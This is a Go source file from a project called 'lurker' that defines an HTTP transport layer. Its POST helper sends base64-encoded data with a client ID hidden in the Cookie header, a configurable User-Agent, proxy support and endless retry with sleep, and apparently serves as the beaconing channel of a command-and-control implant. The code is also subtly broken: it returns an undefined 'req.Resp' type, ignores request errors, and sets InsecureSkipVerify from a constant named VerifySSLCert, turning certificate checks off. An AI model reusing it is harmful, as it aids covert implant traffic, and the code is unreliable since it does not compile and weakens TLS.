package transports

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"time"
	"strings"

	"lurker/lurker/constants"
)

var (
	Client *http.Client
)

func init() {
	proxyFunct := http.ProxyFromEnvironment
	if constants.UseProxy {
		proxyURL, err := url.Parse(constants.Proxy)
		if err == nil {
			proxyFunct = http.ProxyURL(proxyURL)
		} else {
			proxyFunct = http.ProxyFromEnvironment
		}
	}
	tr := &http.Transport{
		Proxy: proxyFunct,
		DialContext: (&net.Dialer{
			Timeout: constants.TimeOut * time.Second,
			KeepAlive: 0,
		}).DialContext,
		MaxIdleConns: 20,
		IdleConnTimeout: constants.TimeOut * time.Second, 
		DisableKeepAlives: true, 
		TLSHandshakeTimeout: constants.TimeOut * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: constants.VerifySSLCert,
		},
	}
	
	Client = &http.Client{
		Transport: tr,
		Timeout: constants.TimeOut * time.Second,
	}
}

func HttpPost(url string, clientID string, data []byte) *req.Resp {
	for {
		webreq, err := http.NewRequest("POST", url, strings.NewReader(base64.URLEncoding.EncodeToString([]byte(data))))
		webreq.Header.Set("User-Agent", constants.UserAgent)
		webreq.Header.Set("Cookie", base64.RawURLEncoding.EncodeToString([]byte(clientID)))
		resp, err := Client.Do(webreq)

		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.SleepTime)
			continue
		} else {
			if resp.StatusCode == http.StatusOK {
				return resp
			}
			break
		}
	}

	return nil
}

func HttpGet(url string, cookies string) *req.Resp {
	for {
		webreq, err := http.NewRequest("GET", url, nil)
		webreq.Header.Set("User-Agent", constants.UserAgent)
		webreq.Header.Set("Cookie", cookies)
		resp, err := Client.Do(webreq)

		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(constants.SleepTime)
			continue
		} else {
			if resp.StatusCode == http.StatusOK {
				return resp
			}
			break
		}
	}
	return nil
}
